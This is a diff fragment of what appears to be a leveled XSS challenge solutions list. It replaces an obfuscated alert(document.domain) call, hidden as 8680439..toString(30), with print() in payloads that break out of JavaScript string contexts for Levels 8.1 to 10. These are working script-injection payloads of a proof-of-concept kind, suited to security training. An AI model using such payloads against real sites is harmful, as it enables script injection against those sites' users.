@@ -64,15 +64,15 @@ this[8680439..toString(30)](document.domain)
 ```
 - Level 8.1 🧪
 ```
-"};this[8680439..toString(30)](document.domain);{"
+"};print();//
 ```
 - Level 9 🧪
 ```
-"};this[8680439..toString(30)](document.domain);{"
+"};print();{"
 ```
 - Level 10 🧪
 ```
-';this[8680439..toString(30)](document.domain);'
+';print();'
 ```
 
 - Level 11 🧪
